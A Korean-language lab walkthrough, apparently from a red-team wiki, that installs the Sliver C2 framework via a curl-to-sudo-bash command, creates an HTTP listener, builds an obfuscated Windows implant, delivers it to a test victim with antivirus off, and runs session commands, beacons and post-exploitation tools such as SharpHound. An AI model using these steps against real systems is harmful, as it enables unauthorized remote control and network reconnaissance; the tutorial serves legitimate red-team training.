# 팀 서버 - Sliver

## Sliver

슬리버(Sliver)는 BishopFox사에서 제작/관리하고 있는 golang 기반의 오픈소스 C2 프레임워크다. 러시아의 정보기관인 SVR(Foreign Intelligence Service)도 2021년 여름 작전에 사용했을 만큼 APT 그룹들 또한 사용하고 있는 C2다. 이와 관련해서 영국의 National Cybersecurity Centre (NCC) 가 발표한 보고서는 [여기서 확인](https://www.ncsc.gov.uk/files/Advisory-further-TTPs-associated-with-SVR-cyber-actors.pdf)할 수 있다.

설치와 튜토리얼은 모두 [슬리버 프로젝트 위키](https://github.com/BishopFox/sliver/wiki/Getting-Started)를 참고했다.

### 설치

다음 명령어를 사용해 슬리버 C2 서버를 설치한다.

```
curl https://sliver.sh/install|sudo bash
< ... 설치 ... > 

┌──(root㉿kali)-[/opt]
└─# sliver
Connecting to localhost:31337 ...

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
                  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain haste
[*] Server v1.5.14 - 1d4422b465a53b78497461930239bb558a0bf652
[*] Welcome to the sliver shell, please type 'help' for options

```

이후 에이전트 생성에 필요한 mingw 를 설치한다.

```
apt install mingw-w64 -y
```

### 튜토리얼 - 리스너 구축 및 사용

제대로된 리스너 구축 및 비컨 생성에 대해 알아보기 전, 먼저 간단하게 슬리버의 기본 기능들을 사용해보자. 이 튜토리얼에서는 HTTP 리스너를 구축한 뒤, 윈도우 10 호스트에서 실행할 수 있는 에이전트를 생성하고, 세션을 구축해본다.&#x20;



**리스너 생성**&#x20;

```
# HTTP 리스너 구축 
sliver> http -L <ip> --lport 8080 

# 예시 
sliver > http -d 192.168.40.182 -l 80

[*] Starting HTTP 192.168.40.182:80 listener ...
[*] Successfully started job #10
```

**에이전트 생성**

```
# 예시 
sliver > generate --http 192.168.40.182 -s /root/operation/demo.exe 

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
 ⠦  Compiling, please wait ...
[*] Build completed in 00:01:01
[*] Implant saved to /root/operation/demo.exe
```

**에이전트 실행**

간단하게 피해자 호스트에서 비컨을 다운 받은 뒤, 실행시킨다. 튜토리얼이기 때문에 디펜더 등의 모든 AV/EDR 솔루션들은 다 꺼놓는다. 슬리버를 사용하는게 주 목적이지, 완전한 레드팀 작전을 수행하는게 주 목적이 아니기 때문이다.

```
# 공격자 웹서버 실행, demo.exe 에이전트 파일 호스팅 
cd /root/operation/
python3 -m http.server 8443

# 피해자 호스트에서 공격자의 웹서버 접근 뒤 demo.exe 다운 및 실행 

# 에이전트 실행 뒤 세션 구축 
[*] Session fef4c787 PREFERRED_ESE - 192.168.40.151:50118 (wkstn01) - windows/amd64 - Mon, 06 Jun 2022 22:11:03 EDT

sliver > sessions 

 ID         Name            Transport   Remote Address         Hostname   Username                Operating System   Last Message                    Health  
========== =============== =========== ====================== ========== ======================= ================== =============================== =========
 fef4c787   PREFERRED_ESE   http(s)     192.168.40.151:50118   wkstn01    WKSTN01\Administrator   windows/amd64      Mon, 06 Jun 2022 22:11:05 EDT   [ALIVE] 
```

**세션 구축**

에이전트로 구축한 세션을 실행한 뒤 원하는 명령어들을 실행한다.

```
sliver > sessions -i fef4c787

[*] Active session PREFERRED_ESE (fef4c787)

sliver (PREFERRED_ESE) > whoami

Logon ID: WKSTN01\Administrator
[*] Current Token ID: WKSTN01\Administrator

sliver (PREFERRED_ESE) > ls

C:\Users
========
drwxrwxrwx  Administrator       <dir>  Thu Dec 16 21:13:52 -0500 2021
drwxrwxrwx  Administrator.CHOI  <dir>  Mon Feb 07 22:09:25 -0500 2022
Lrw-rw-rw-  All Users           0 B    Sat Dec 07 04:30:39 -0500 2019
```

#### 비컨 사용&#x20;

세션 기반이 아닌 비컨 기반의 에이전트는 다음과 같이 사용한다.&#x20;

```
sliver > beacons
sliver > use 5364f10d-43d0-41e5-8bfe-55c09a0ee8d3

[*] Active beacon LOST_QUICKSAND (5364f10d-43d0-41e5-8bfe-55c09a0ee8d3)

sliver (LOST_QUICKSAND) > 
```

#### 플러그인 설치&#x20;

슬리버는 약 60가지의 포스트 익스플로잇 툴들을 제공한다.&#x20;

```
sliver> armory install all 
sliver> use <beacon-name>

# 설치된 툴들 확인 
sliver> help  
sliver> sharp-hound-3 '' -c All -d choi.local 
```

앞으로 인프라를 구축하면서 슬리버의 고급 기능들을 사용하겠지만, 일단 튜토리얼은 여기서 마친다.
